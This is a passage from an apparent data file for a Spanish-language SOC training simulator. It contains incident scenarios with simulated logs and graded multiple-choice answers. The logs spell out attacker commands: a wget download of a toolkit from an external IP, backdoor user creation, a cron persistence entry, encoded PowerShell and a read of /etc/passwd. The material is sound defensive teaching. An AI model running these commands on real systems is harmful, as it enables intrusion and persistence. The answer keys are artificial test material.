              "En un SOC real, tratar el CPU spike como el incidente principal lleva a investigar srv-db-01 cuando el punto de origen es ws-carlos. El equipo perdería tiempo revisando el servidor equivocado.",

          },
        ],
      },
      {
        id: "assign",
        title: "Paso 2 — Asignar el incidente",
        description:
          "¿Quién debería responder a este incidente? Considerá que hay compromiso de workstation Y movimiento lateral a srv-db-01.",
        hint: "Esto ya no es un caso para SOC L2. Pensa en el nivel de escalamiento.",
        options: [
          {
            id: "a",
            label:
              "Solo Diego López (SOC L2) — él puede manejar todo",
            correct: false,
            explanation:
              "El PB-IR-002 clasifica esto como NIVEL 3: exfiltración de datos + movimiento lateral a DB + impacto en pagos. Diego puede iniciar la respuesta, pero esto requiere escalamiento inmediato a nivel superior.",
            consequence:
              "En un SOC real, intentar manejar un incidente nivel 3 solo con el SOC L2 sobrepasa sus capacidades. La contención requiere DevOps, el escalamiento requiere CISO, y la notificación legal requiere DPO.",

          },
          {
            id: "b",
            label:
              "Diego López (SOC L2) para investigación + Ana Martínez (DevOps) para contención + escalamiento a CISO por impacto nivel 3",
            correct: true,
            explanation:
              "Correcto. El protocolo de escalamiento indica NIVEL 3 cuando hay exfiltración de datos de clientes e impacto en servicios de pago. Diego investiga, Ana contiene, y el CISO debe ser notificado por el nivel de impacto.",
          },
          {
            id: "c",
            label:
              "Martín González (SysAdmin) — que apague las máquinas",
            correct: false,
            explanation:
              "Apagar no es contención inteligente. Se necesita forense en vivo (imagen de RAM) antes de apagar. Martín sería útil para la contención técnica, pero bajo dirección del equipo de seguridad.",
            consequence:
              "En un SOC real, apagar la máquina sin imagen forense destruye evidencia en memoria RAM que contiene: contraseñas en claro, llaves de cifrado, tokens de sesión, y la tabla de conexiones del malware.",

          },
          {
            id: "d",
            label:
              "Sofía Ramírez (Gerente de Ops) — que decida qué hacer",
            correct: false,
            explanation:
              "Sofía no es parte de la cadena de respuesta técnica. Su rol es comunicacional y estratégico, no táctico. Ella se involucra después del escalamiento al CISO.",
            consequence:
              "En un SOC real, delegar decisiones técnicas de contención a un gerente no técnico resulta en demoras mientras busca aprobación. Cada minuto de demora = más datos exfiltrados y más persistencia instalada.",

          },
        ],
      },
      {
        id: "playbook",
        title: "Paso 3 — Consultar el playbook",
        description:
          "Según el PB-LAT-001, ¿cuál es la PRIMERA acción de contención?",
        hint: "Pensá en qué hacer con la máquina que está generando el ataque.",
        options: [
          {
            id: "a",
            label:
              "Apagar ws-carlos-01 inmediatamente para cortar la conexión",
            correct: false,
            explanation:
              "El playbook indica obtener imagen forense ANTES de apagar. Apagar destruye evidencia en memoria (RAM) que es crucial para entender el alcance del compromiso.",
            consequence:
              "En un SOC real, apagar una workstation comprometida sin forense destruye la memoria volátil que contiene: el keylogger activo, las conexiones C2 en curso, las credenciales robadas en memoria, y los scripts de persistencia.",

          },
          {
            id: "b",
            label:
              "Aislar la workstation de la red (desconectar del switch / quarantinar VLAN)",
            correct: true,
            explanation:
              "Correcto. El primer paso es aislar la máquina de la red para cortar el movimiento lateral sin destruir evidencia. Se desconecta del switch o se mueve a una VLAN de quarantaine. La imagen forense se toma después.",
          },
          {
            id: "c",
            label:
              "Cambiar la contraseña de Carlos y seguir observando",
            correct: false,
            explanation:
              "Cambiar la contraseña no corta la conexión si el atacante ya tiene persistencia en la máquina. La workstation está comprometida y ejecutando código malicioso. Aislar es la primera prioridad.",
            consequence:
              "En un SOC real, cambiar la contraseña sin aislar la workstation es inútil: el keylogger captura la nueva contraseña inmediatamente, y el atacante sigue controlando la máquina.",

          },
          {
            id: "d",
            label:
              "Bloquear la IP 203.0.113.50 en el firewall",
            correct: false,
            explanation:
              "Bloquear la IP de C2 es importante, pero es el paso 3 del protocolo. Primero se aisla la máquina comprometida (paso 1) y luego se busca el alcance (paso 2). Si aislás primero, cortás la exfiltración inmediatamente.",
            consequence:
              "En un SOC real, bloquear la IP de C2 sin aislar la workstation permite que el malware siga exfiltrando por otros medios: DNS tunneling, HTTPS a otros dominios, o incluso steganografía en imágenes.",

          },
        ],
      },
      {
        id: "classify",
        title: "Paso 4 — Clasificar la alerta",
        description:
          "¿Cuál es la clasificación correcta de este incidente?",
        hint: "Compromiso de workstation + movimiento lateral + dump de DB + exfiltración externa.",
        options: [
          {
            id: "a",
            label:
              "Falso positivo — Carlos está haciendo su trabajo normal",
            correct: false,
            explanation:
              "Carlos es Analista Financiero. No tiene razón técnica para ejecutar PowerShell encoded, conectarse por SMB a srv-db-01, dumphear PostgreSQL, crear un zip de 847MB, y subirlo por HTTPS a una IP externa. Esto NO es su trabajo.",
            consequence:
              "En un SOC real, clasificar movimiento lateral con exfiltración como \"trabajo normal\" de un financiero es un error catastrófico. La base de datos completa de clientes está comprometida y el atacante tiene persistencia en la red.",

          },
          {
            id: "b",
            label:
              "Positivo verdadero — Compromiso de workstation con movimiento lateral y exfiltración confirmada",
            correct: true,
            explanation:
              "Correcto. La evidencia es abrumadora: PowerShell encoded → SMB/WMI lateral → dump PostgreSQL → exfiltración HTTPS → creación de usuarios → persistencia. Cada paso es un indicador de compromiso que se encadena en un ataque completo.",
          },
          {
            id: "c",
            label:
              "Requiere investigación — no sabemos si es un ataque o una migración",
            correct: false,
            explanation:
              "Una migración no usa PowerShell encoded, no hace dump de DBs, no crea zips de 847MB, no sube datos a IPs externas, y no crea usuarios backdoor. Los indicadores son claros: esto es malicioso.",
            consequence:
              "En un SOC real, dudar entre \"ataque\" y \"migración\" cuando hay PowerShell encoded + dump de DB + exfiltración + backdoors refleja falta de experiencia. Cada minuto de duda = más datos robados.",

          },
        ],
      },
      {
        id: "writeup",
        title: "Paso 5 — Redacción del reporte",
        description:
          "Escribí el reporte. Este es un incidente nivel 3 — necesitás un reporte completo.",
        hint: "Incluí: timeline, IOC, impacto, y acciones con prioridad.",
        options: [
          {
            id: "a",
            label:
              "La computadora de Carlos fue comprometida. Hackearon la base de datos. Urge.",
            correct: false,
            explanation:
              "Sin datos técnicos, sin timeline, sin IOC, sin acciones concretas. Un reporte así genera más preguntas que respuestas.",
            consequence:
              "En un SOC real, un reporte sin IOC no permite bloquear indicadores de compromiso en otros sistemas. Sin timeline, no se puede determinar cuándo empezó el ataque ni qué datos se perdieron en cada fase.",

          },
          {
            id: "b",
            label:
              "Compromiso de ws-carlos-01 (10.10.3.22) con movimiento lateral a srv-db-01 (10.10.5.20). Timeline: 16:35 PowerShell encoded → 16:36 SMB/WMI lateral → 16:37 dump PostgreSQL + exfiltración vía HTTPS a 203.0.113.50. IOC: SHA256 del payload PowerShell, IP C2 (203.0.113.50), dominio evil-cdn.com. Impacto NIVEL 3: posible fuga de datos de clientes de pagos. Acciones ejecutadas: workstation aislada, IP C2 bloqueada, sesiones de Carlos revocadas. Acciones pendientes: imagen forense, forense de srv-db-01, notificación DPO, escalamiento CISO.",
            correct: true,
            explanation:
              "Reporte completo de nivel 3: TIMELINE preciso (minuto a minuto), IOC (IPs, hashes), IMPACTO clasificado, ACCIONES ejecutadas vs pendientes. Este formato permite a cualquier persona entender el incidente y tomar decisiones informadas.",
          },
          {
            id: "c",
            label:
              "Se movieron cosas por la red y alguien robó datos. Hay que cambiar todas las contraseñas.",
            correct: false,
            explanation:
              "Sin specifics, sin classification de impacto, sin IOC. 'Cambiar todas las contraseñas' no es una acción de contención — es remediación genérica que no aborda la raíz del problema.",
            consequence:
              "En un SOC real, \"cambiar todas las contraseñas\" sin identificar qué credenciales específicamente están comprometidas es inútil: si no cambias la que usa el malware, el atacante sigue teniendo acceso.",

          },
        ],
      },
      {
        id: "return",
        title: "Paso 6 — Volver al panel",
        description:
          "Incidente nivel 3 documentado y escalado. ¿Qué sigue en tu flujo de trabajo?",
        hint: "Pensá en qué queda pendiente mientras otros equipos ejecutan.",
        options: [
          {
            id: "a",
            label:
              "Cerrar el caso — ya está todo documentado y escalado",
            correct: false,
            explanation:
              "Un incidente nivel 3 nunca se cierra con solo documentar. Hay que seguir monitoreando: ¿hay más workstations comprometidas? ¿el atacante tiene persistencia? ¿hay más exfiltración en curso?",
            consequence:
              "En un SOC real, cerrar un incidente nivel 3 sin verificar remediación completa es negligencia. El atacante podría tener backdoors en srv-db-01, acceso SSH persistente, y cron jobs que recomprometan el sistema cada 24 horas.",

          },
          {
            id: "b",
            label:
              "Volver al panel de logs para monitorear si hay más activity maliciosa de otras IPs o servidores, mientras el equipo ejecuta la contención",
            correct: true,
            explanation:
              "Correcto. Tu rol como SOC analyst es vigilancia continua. Mientras DevOps contiene y el forense investiga, vos volvés al panel para: detectar si hay más workstations comprometidas, identificar si el atacante tiene otros puntos de acceso, y monitorear si la contención está funcionando.",
          },
          {
            id: "c",
            label:
              "Ir a la workstation de Carlos a revisarla personalmente",
            correct: false,
            explanation:
              "Como SOC analyst, no deberías manipular evidencia físicamente. Eso es trabajo del equipo forense. Tu rol es análisis de logs, clasificación, y monitoreo continuo.",
            consequence:
              "En un SOC real, tocar la workstation físicamente sin protocolo forense puede alterar timestamps de archivos, contaminar evidencia de huellas digitales, y comprometer la cadena de custodia para uso legal.",

          },
        ],
      },
    ],
    summary:
      "Compromiso de ws-carlos-01 (Analista Financiero) con movimiento lateral a srv-db-01 vía SMB/WMI. El atacante ejecutó dump de PostgreSQL, creó zip de 847MB y exfiltró vía HTTPS a 203.0.113.50. Impacto NIVEL 3: posible fuga de datos financieros y de clientes. Clasificación: POSITIVO VERDADERO — Compromiso completo con exfiltración.",
  },
  {
    id: "phishing-credentials",
    title: "Phishing y robo de credenciales",
    severity: "high",
    description:
      "Microsoft Defender detectó un correo phishing dirigido a Sofía Ramírez que contenía un enlace malicioso. Sofía hizo clic en el enlace y sus credenciales de dominio fueron capturadas. Posteriormente se detectó uso de esas credenciales desde una IP no registrada.",
    alertSource: "Microsoft Defender + Wazuh Rule 11200",
    alertTime: "2026-08-24 10:15:33 UTC",
    logs: [
      { line: 1, timestamp: "Aug 24 09:30:05", source: "srv-mail-01 postfix/smtpd", message: "connect from mail-relay.external[203.0.113.80]", severity: "info", flagged: false },
      { line: 2, timestamp: "Aug 24 09:30:12", source: "srv-mail-01 postfix/cleanup", message: "BA7C1E03: message-id=<20260824093005.ABC123@mail-relay.external>", severity: "info", flagged: false },
      { line: 3, timestamp: "Aug 24 09:30:15", source: "srv-mail-01 postfix/qmgr", message: "BA7C1E03: from=<noreply@microsft-security.com>, size=4521, nrcpt=1 (queue active)", severity: "warning", flagged: true },
      { line: 4, timestamp: "Aug 24 09:31:20", source: "srv-web-01 nginx.access", message: "GET /api/health 200 -- 10.10.2.44 -- Lucía Fernández Dev", severity: "info", flagged: false },
      { line: 5, timestamp: "Aug 24 09:32:00", source: "srv-monitor cron", message: "Health check: srv-web-01 -- CPU 18% -- RAM 42% -- Disk 61%", severity: "info", flagged: false },
      { line: 6, timestamp: "Aug 24 09:33:10", source: "srv-web-01 node.app", message: "Queue processor: 89 jobs completed, 12 pending", severity: "info", flagged: false },
      { line: 7, timestamp: "Aug 24 09:34:22", source: "ws-sofia-01 outlook", message: "Email delivered to Inbox: 'Re: Urgente - Actualizacion de seguridad requerida' from noreply@microsft-security.com", severity: "warning", flagged: true },
      { line: 8, timestamp: "Aug 24 09:35:00", source: "srv-web-01 nginx.access", message: "POST /api/payments/process 201 -- 10.10.3.10 -- Sofia Ramirez Ops", severity: "info", flagged: false },
      { line: 9, timestamp: "Aug 24 09:36:15", source: "srv-mail-01 postfix/smtp", message: "BA7C1E04: to=<admin@corp.local>, relay=none, delay=0.08, dsn=2.0.0, status=sent (250 OK)", severity: "info", flagged: false },
      { line: 10, timestamp: "Aug 24 09:37:30", source: "srv-web-01 sshd[22601]", message: "Accepted publickey for diego from 10.10.1.20 port 49901 ssh2", severity: "info", flagged: false },
      { line: 11, timestamp: "Aug 24 09:38:00", source: "srv-monitor cron", message: "Metric aggregation: 7,832 events -- avg latency 11ms", severity: "info", flagged: false },
      { line: 12, timestamp: "Aug 24 09:39:45", source: "srv-web-01 nginx.access", message: "GET /dashboard 200 -- 10.10.1.20 -- Diego López SOC", severity: "info", flagged: false },
      { line: 13, timestamp: "Aug 24 09:40:10", source: "srv-web-01 node.app", message: "SSL certificate renewal check -- expires in 21 days", severity: "info", flagged: false },
      { line: 14, timestamp: "Aug 24 09:41:30", source: "srv-web-01 nginx.access", message: "GET /api/orders/history 200 -- 10.10.3.22 -- Carlos Ruiz Corp", severity: "info", flagged: false },
      { line: 15, timestamp: "Aug 24 09:42:00", source: "srv-monitor cron", message: "Health check: srv-app-01 -- CPU 35% -- RAM 52% -- Disk 69%", severity: "info", flagged: false },
      { line: 16, timestamp: "Aug 24 09:43:15", source: "ws-sofia-01 sysmon", message: "ProcessCreate: chrome.exe -- navigated to https://portal-microsft.com/auth/update?token=BA7C1E03", severity: "warning", flagged: true },
      { line: 17, timestamp: "Aug 24 09:43:22", source: "ws-sofia-01 sysmon", message: "NetworkConnection: chrome.exe -> 198.51.100.44:443 (HTTPS)", severity: "warning", flagged: true },
      { line: 18, timestamp: "Aug 24 09:43:45", source: "ws-sofia-01 sysmon", message: "FileCreate: C:\\Users\\sofia\\AppData\\Local\\Temp\\login.html (phishing page rendered)", severity: "warning", flagged: true },
      { line: 19, timestamp: "Aug 24 09:44:02", source: "ws-sofia-01 sysmon", message: "ProcessCreate: chrome.exe -- POST to https://portal-microsft.com/auth/collect (credentials submitted)", severity: "critical", flagged: true },
      { line: 20, timestamp: "Aug 24 09:44:10", source: "ws-sofia-01 sysmon", message: "NetworkConnection: chrome.exe -> 198.51.100.44:443 (credential exfil)", severity: "critical", flagged: true },
      { line: 21, timestamp: "Aug 24 09:45:00", source: "srv-web-01 nginx.access", message: "POST /api/reports/generate 202 -- 10.10.1.15 -- Martin Gonzalez Admin", severity: "info", flagged: false },
      { line: 22, timestamp: "Aug 24 09:46:30", source: "srv-mail-01 postfix/qmgr", message: "BA7C1E05: from=<alerts@monitoring.local>, size=1102, nrcpt=1 (queue active)", severity: "info", flagged: false },
      { line: 23, timestamp: "Aug 24 09:47:00", source: "srv-web-01 sshd[22610]", message: "Accepted publickey for sofia from 10.10.3.10 port 50001 ssh2", severity: "info", flagged: false },
      { line: 24, timestamp: "Aug 24 09:48:15", source: "srv-web-01 nginx.access", message: "GET /api/health 200 -- 10.10.2.44 -- Lucía Fernández Dev", severity: "info", flagged: false },
      { line: 25, timestamp: "Aug 24 09:49:30", source: "srv-monitor cron", message: "Health check: srv-db-01 -- CPU 6% -- RAM 38% -- Disk 64%", severity: "info", flagged: false },
      { line: 26, timestamp: "Aug 24 09:50:00", source: "srv-web-01 node.app", message: "Queue processor: 104 jobs completed, 15 pending", severity: "info", flagged: false },
      { line: 27, timestamp: "Aug 24 09:51:10", source: "srv-web-01 kernel", message: "[UFW BLOCK] IN=eth0 SRC=192.0.2.33 DST=10.10.1.10 PROTO=TCP SPT=8080 DPT=443", severity: "info", flagged: false },
      { line: 28, timestamp: "Aug 24 09:52:30", source: "ws-sofia-01 sysmon", message: "ProcessCreate: powershell.exe -- Invoke-WebRequest -Uri https://portal-microsft.com/auth/verify -UseBasicParsing", severity: "critical", flagged: true },
      { line: 29, timestamp: "Aug 24 09:52:45", source: "ws-sofia-01 sysmon", message: "NetworkConnection: powershell.exe -> 198.51.100.44:443 (C2 verification)", severity: "critical", flagged: true },
      { line: 30, timestamp: "Aug 24 09:53:00", source: "ws-sofia-01 sysmon", message: "ProcessCreate: mshta.exe -- payload.hta (persistence mechanism)", severity: "critical", flagged: true },
      { line: 31, timestamp: "Aug 24 09:54:15", source: "ws-sofia-01 sysmon", message: "ScheduledTaskCreate: schtasks /create /tn SecurityUpdate /tr C:\\Users\\sofia\\AppData\\Local\\Temp\\payload.hta /sc daily /st 09:00", severity: "critical", flagged: true },
      { line: 32, timestamp: "Aug 24 09:55:00", source: "srv-web-01 nginx.access", message: "GET /api/products?page=1 200 -- 10.10.3.10 -- Sofia Ramirez Ops", severity: "info", flagged: false },
      { line: 33, timestamp: "Aug 24 09:56:30", source: "srv-mail-01 postfix/smtp", message: "BA7C1E06: to=<team@corp.local>, relay=mail.corp.local[10.10.5.10], delay=0.11, status=sent (250 OK)", severity: "info", flagged: false },
      { line: 34, timestamp: "Aug 24 10:00:05", source: "ws-sofia-01 sysmon", message: "NetworkConnection: chrome.exe -> 198.51.100.44:443 (C2 beacon -- credentials validated)", severity: "critical", flagged: true },
      { line: 35, timestamp: "Aug 24 10:01:10", source: "ws-sofia-01 sysmon", message: "ProcessCreate: cmd.exe /c whoami /all > C:\\Users\\sofia\\AppData\\Local\\Temp\\enum.txt", severity: "critical", flagged: true },
      { line: 36, timestamp: "Aug 24 10:01:20", source: "ws-sofia-01 sysmon", message: "ProcessCreate: cmd.exe /c net group Domain Admins /domain", severity: "critical", flagged: true },
      { line: 37, timestamp: "Aug 24 10:01:35", source: "ws-sofia-01 sysmon", message: "FileCreate: C:\\Users\\sofia\\AppData\\Local\\Temp\\enum.txt (recon output)", severity: "critical", flagged: true },
      { line: 38, timestamp: "Aug 24 10:02:00", source: "ws-sofia-01 sysmon", message: "NetworkConnection: chrome.exe -> 198.51.100.44:443 (upload enum results)", severity: "critical", flagged: true },
      { line: 39, timestamp: "Aug 24 10:03:15", source: "ws-sofia-01 sysmon", message: "ProcessCreate: powershell.exe -enc SQBmACgAJABj... (lateral movement attempt)", severity: "critical", flagged: true },
      { line: 40, timestamp: "Aug 24 10:03:30", source: "ws-sofia-01 sysmon", message: "NetworkConnection: powershell.exe -> 10.10.5.20:445 (SMB to srv-db-01)", severity: "critical", flagged: true },
      { line: 41, timestamp: "Aug 24 10:04:00", source: "srv-web-01 nginx.access", message: "POST /api/payments/process 200 -- 10.10.3.10 -- Sofia Ramirez Ops", severity: "info", flagged: false },
      { line: 42, timestamp: "Aug 24 10:05:30", source: "srv-monitor cron", message: "Health check: srv-web-01 -- CPU 22% -- RAM 46% -- Disk 61%", severity: "info", flagged: false },
      { line: 43, timestamp: "Aug 24 10:06:15", source: "srv-web-01 sshd[22650]", message: "Accepted publickey for carlos from 10.10.3.22 port 50101 ssh2", severity: "info", flagged: false },
      { line: 44, timestamp: "Aug 24 10:07:00", source: "srv-web-01 node.app", message: "Cache hit ratio: 93.8% -- Redis memory: 289MB/512MB", severity: "info", flagged: false },
      { line: 45, timestamp: "Aug 24 10:08:30", source: "srv-web-01 nginx.access", message: "GET /api/health 200 -- 10.10.1.15 -- Martin Gonzalez Admin", severity: "info", flagged: false },
      { line: 46, timestamp: "Aug 24 10:09:45", source: "srv-monitor cron", message: "Metric aggregation: 9,102 events -- avg latency 12ms", severity: "info", flagged: false },
      { line: 47, timestamp: "Aug 24 10:10:00", source: "ws-sofia-01 sysmon", message: "ProcessCreate: cmd.exe /c net user svc-backdoor P@ssw0rd2026! /add", severity: "critical", flagged: true },
      { line: 48, timestamp: "Aug 24 10:10:15", source: "ws-sofia-01 sysmon", message: "ProcessCreate: cmd.exe /c net localgroup administrators svc-backdoor /add", severity: "critical", flagged: true },
      { line: 49, timestamp: "Aug 24 10:10:30", source: "ws-sofia-01 sysmon", message: "NetworkConnection: chrome.exe -> 198.51.100.44:443 (C2 -- user created)", severity: "critical", flagged: true },
      { line: 50, timestamp: "Aug 24 10:11:00", source: "srv-web-01 nginx.access", message: "GET /api/orders/history 200 -- 10.10.3.10 -- Sofia Ramirez Ops", severity: "info", flagged: false },
      { line: 51, timestamp: "Aug 24 10:12:15", source: "srv-web-01 sshd[22660]", message: "Accepted password for sofia from 198.51.100.44 port 50201 ssh2", severity: "critical", flagged: true },
      { line: 52, timestamp: "Aug 24 10:12:30", source: "srv-web-01 sudo: sofia", message: "TTY=pts/1 ; PWD=/home/sofia ; USER=root ; COMMAND=/usr/bin/cat /etc/passwd", severity: "critical", flagged: true },
      { line: 53, timestamp: "Aug 24 10:13:00", source: "srv-web-01 sshd[22665]", message: "Accepted password for sofia from 198.51.100.44 port 50301 ssh2", severity: "critical", flagged: true },
      { line: 54, timestamp: "Aug 24 10:13:30", source: "srv-web-01 kernel", message: "[UFW BLOCK] IN=eth0 SRC=198.51.100.44 DST=10.10.5.20 PROTO=TCP SPT=50301 DPT=5432", severity: "warning", flagged: true },
      { line: 55, timestamp: "Aug 24 10:14:00", source: "srv-web-01 wget", message: "connecting to 198.51.100.44:8080 -- downloading toolkit.tar.gz -- saved to /tmp/.update_helper", severity: "critical", flagged: true },
      { line: 56, timestamp: "Aug 24 10:14:30", source: "srv-web-01 useradd", message: "new user 'svc-monitor' (uid=1006) added to /etc/passwd", severity: "critical", flagged: true },
      { line: 57, timestamp: "Aug 24 10:15:00", source: "srv-web-01 crond", message: "new crontab entry: 0 3 * * * /tmp/.update_helper --silent", severity: "critical", flagged: true },
      { line: 58, timestamp: "Aug 24 10:15:33", source: "srv-monitor alert", message: "Microsoft Defender: Phishing credential reuse detected -- sofia account used from external IP 198.51.100.44", severity: "critical", flagged: true },
    ],
    playbook: [],
    steps: [
      {
        id: "identify",
        title: "Paso 1 -- Identificar los logs relevantes",
        description: "Revisá el log del incidente de phishing. ¿Qué líneas son parte del ataque?",
        hint: "Seguí el correo phishing desde la entrega hasta la explotación.",
        options: [
          {
            id: "a",
            label: "Solo las líneas 3 y 7 (el correo phishing y su entrega)",
            correct: false,
            explanation: "El correo es solo el vector inicial. Necesitás ver la cadena completa: clic en el enlace, robo de credenciales, uso de credenciales robadas, movimiento lateral, y persistencia.",
            consequence: "En un SOC real, reportar solo el phishing sin ver la explotación significa que el equipo no detecta que las credenciales ya fueron usadas para acceder al servidor web y crear usuarios backdoor.",
          },
          {
            id: "b",
            label: "Líneas 3, 7, 16-20, 28-31, 34-40, 47-58 (cadena completa del ataque)",
            correct: true,
            explanation: "Correcto. La secuencia es: correo phishing entregado, clic en enlace, robo de credenciales, verificación C2, reconocimiento, intento de lateral movement, credenciales usadas desde IP externa, creación de usuarios, persistencia.",
          },
          {
            id: "c",
            label: "Todas las líneas del log (1-58)",
            correct: false,
            explanation: "Las líneas normales incluyen activity de Lucía, Carlos, Diego, health checks y otros usuarios legítimos. No son parte del incidente. Incluir todo dificulta el análisis.",
            consequence: "En un SOC real, entregar un reporte con 58 líneas donde la mitad es tráfico legítimo hace que el equipo de contención pierda horas investigando usuarios inocentes mientras el atacante sigue activo.",
          },
          {
            id: "d",
            label: "Solo la línea 16 (la navegación al sitio phishing)",
            correct: false,
            explanation: "La navegación es el punto de entrada, pero sin ver la exfiltración de credenciales, el uso de esas credenciales desde IP externa, y la persistencia instalada, no dimensionás el alcance del compromiso.",
            consequence: "En un SOC real, reportar solo el clic en el enlace sin ver la explotación posterior hace que el equipo trate esto como un intento fallido cuando en realidad las credenciales ya fueron comprometidas y el atacante tiene acceso activo.",
          },
        ],
      },
      {
        id: "assign",
        title: "Paso 2 -- Asignar el incidente",
        description: "¿Quién debería tomar este caso? Considerá que hay credenciales comprometidas y movimiento lateral activo.",
        hint: "Pensá en qué servidores están afectados y quién tiene acceso de administración.",
        options: [
          {
            id: "a",
            label: "Sofía Ramírez (Gerente de Operaciones) -- ella es la víctima",
            correct: false,
            explanation: "Sofía es la víctima del phishing, no la respuesta. Ella no tiene permisos técnicos para contener el incidente y su cuenta ya está comprometida. Asignarle el caso es un riesgo de seguridad.",
            consequence: "En un SOC real, dar acceso de administración a una cuenta comprometida para 'arreglar' el problema es como dar las llaves al ladrón. El atacante puede monitorear todas las acciones desde la cuenta de Sofía.",
          },
          {
            id: "b",
            label: "Diego López (SOC L2) para investigación + Ana Martínez (DevOps) para contención + escalamiento a CISO",
            correct: true,
            explanation: "Correcto. El incidente requiere investigación (Diego), contención técnica (Ana -- revocar credenciales, bloquear IP, aislar cuentas), y escalamiento porque hay movimiento lateral y persistencia activa.",
          },
          {
            id: "c",
            label: "Martín González (SysAdmin) -- que cambie la contraseña de Sofía",
            correct: false,
            explanation: "Cambiar la contraseña de Sofía no detiene al atacante que ya tiene persistencia en la máquina. El malware sigue activo y capturará la nueva contraseña. Se necesita aislar la workstation primero.",
            consequence: "En un SOC real, cambiar la contraseña sin aislar la workstation es inútil: el keylogger captura la nueva contraseña y el atacante sigue teniendo acceso completo.",
          },
          {
            id: "d",
            label: "Carlos Ruiz (Analista Financiero) -- que revise si hay datos financieros afectados",
            correct: false,
            explanation: "Carlos no tiene acceso técnico a srv-web-01 ni conocimiento de seguridad. Su involvement sería solo DESPUÉS de la contención, si se confirma que datos financieros fueron comprometidos.",
            consequence: "En un SOC real, asignar un incidente activo de seguridad a un analista financiero retrasa la contención horas. Mientras Carlos revisa spreadsheets, el atacante sigue moviéndose lateralmente.",
          },
        ],
      },
      {
        id: "playbook",
        title: "Paso 3 -- Consultar el playbook",
        description: "El playbook está vacío. Basándote en tu conocimiento de respuesta a incidentes de phishing, ¿cuál es la PRIMERA acción de contención?",
        hint: "Pensá en qué hacer con la cuenta comprometida y la máquina afectada.",
        options: [
          {
            id: "a",
            label: "Cambiar la contraseña de Sofía y seguir monitoreando",
            correct: false,
            explanation: "Cambiar la contraseña no es suficiente cuando hay persistencia en la máquina. El malware capturará la nueva contraseña y el atacante ya tiene usuarios backdoor creados.",
            consequence: "En un SOC real, cambiar la contraseña sin aislar la máquina es como cambiar la cerradura mientras el ladrón está adentro. Sigue teniendo acceso por otras puertas.",
          },
          {
            id: "b",
            label: "Desactivar la cuenta de Sofía, aislar ws-sofia-01 de la red, y bloquear la IP 198.51.100.44 en el firewall perimetral",
            correct: true,
            explanation: "Correcto. La contención de phishing requiere: 1) desactivar la cuenta comprometida para cortar acceso, 2) aislar la workstation para detener el malware, 3) bloquear la IP del atacante. En ese orden.",
          },
          {
            id: "c",
            label: "Reinstalar el sistema operativo en ws-sofia-01",
            correct: false,
            explanation: "Reinstalar es una acción de remediación, no de contención. Primero se aisla y se contiene. La reinstalación se hace después del forense. Además, sin imagen forense se pierde evidencia.",
            consequence: "En un SOC real, reinstalar sin forense destruye evidencia clave: qué datos se robaron, qué usuarios backdoor se crearon, y qué persistencia se instaló. Sin esto, no se puede determinar el alcance completo.",
          },
          {
            id: "d",
            label: "Enviar un correo a todos los empleados sobre phishing",
            correct: false,
            explanation: "La comunicación es importante, pero es una acción de concientización, no de contención. Primero se contiene el incidente activo, luego se comunica al resto de la organización.",
            consequence: "En un SOC real, priorizar la comunicación sobre la contención permite que el atacante siga explotando. Otros empleados pueden recibir phishing similar, pero la prioridad es cortar el acceso activo.",
          },
        ],
      },
      {
        id: "classify",
        title: "Paso 4 -- Clasificar la alerta",
        description: "¿Cuál es la clasificación correcta de este incidente?",
        hint: "Considerá: phishing exitoso, credenciales robadas, acceso externo, usuarios creados, persistencia.",
        options: [
          {
            id: "a",
            label: "Falso positivo -- Sofía probablemente se confundió con un correo legítimo",
            correct: false,
            explanation: "Aunque Sofía fue la víctima del phishing, el impacto real es que las credenciales fueron robadas y usadas para acceder al servidor, crear usuarios backdoor e instalar persistencia. Esto es un compromiso activo.",
            consequence: "En un SOC real, tratar phishing exitoso como \'error humano sin impacto\' ignora que el atacante ya tiene acceso al servidor, usuarios creados, y malware persistente operando activamente.",
          },
          {
            id: "b",
            label: "Positivo verdadero -- Phishing con robo de credenciales y compromiso confirmado",
            correct: true,
            explanation: "Correcto. La cadena de evidencia es completa: phishing, robo de credenciales, acceso desde IP externa, reconocimiento, creación de usuarios, persistencia. El atacante tiene acceso activo al servidor.",
          },
          {
            id: "c",
            label: "Requiere investigación -- no sabemos si Sofía dio clic voluntariamente",
            correct: false,
            explanation: "Da igual si fue voluntario o no. Las credenciales fueron comprometidas y ya se están usando desde una IP externa. La intención de Sofía no cambia el hecho de que hay un compromiso activo.",
            consequence: "En un SOC real, debatir la culpa de la víctima mientras el atacante sigue activo es un error de priorización. La clasificación debe basarse en evidencia técnica, no en intención humana.",
          },
        ],
      },
      {
        id: "writeup",
        title: "Paso 5 -- Redacción del reporte",
        description: "Escribí el reporte del incidente. ¿Cuál es la redacción correcta?",
        hint: "Incluí: vector de ataque, credenciales comprometidas, servidores afectados, y acciones.",
        options: [
          {
            id: "a",
            label: "Sofía hizo clic en un phishing. Hay que cambiar su contraseña.",
            correct: false,
            explanation: "Demasiado vago. No menciona el servidor comprometido, los usuarios creados, la persistencia, ni las acciones de contención necesarias.",
            consequence: "En un SOC real, un reporte así hace que el equipo subestime la gravedad. No detectarán que hay usuarios backdoor activos y malware persistente en srv-web-01.",
          },
          {
            id: "b",
            label: "Phishing exitoso contra Sofía Ramírez (Ops) -- credenciales de dominio comprometidas via portal-microsft.com (198.51.100.44). Credenciales usadas desde IP externa para acceder a srv-web-01 vía SSH (10:12:15 UTC). Post-acceso: lectura de /etc/passwd, creación de usuario 'svc-monitor' (uid=1006), descarga de toolkit a /tmp/.update_helper, crontab persistente (0 3 * * *). Intento de lateral movement a srv-db-01 bloqueado por UFW. Impacto: compromiso de srv-web-01 con persistencia. Acciones requeridas: desactivar cuenta sofia, aislar ws-sofia-01, bloquear IP 198.51.100.44, eliminar usuario svc-monitor, remover crontab, forense de ws-sofia-01.",
            correct: true,
            explanation: "Reporte completo: QUÉ (phishing + credenciales comprometidas), CÓMO (portal-microsft.com), QUÉ SE AFECTÓ (srv-web-01), POST-ACCESO (usuarios creados, persistencia, toolkit), IMPACTO, y ACCIONES concretas. Formato profesional SOC.",
          },
          {
            id: "c",
            label: "Un empleado abrió un correo malo y hackearon el servidor. Hay que poner mejor antivirus.",
            correct: false,
            explanation: "Lenguaje informal sin datos técnicos. 'Mejor antivirus' no es una acción de contención. No hay IP, timestamp, servidor específico, ni plan de remediación.",
            consequence: "En un SOC real, este tipo de reporte no permite ninguna acción de contención. El equipo no sabe qué bloquear, qué servidor aislar, ni qué usuarios eliminar.",
          },
        ],
      },
      {
        id: "return",
        title: "Paso 6 -- Volver al panel",
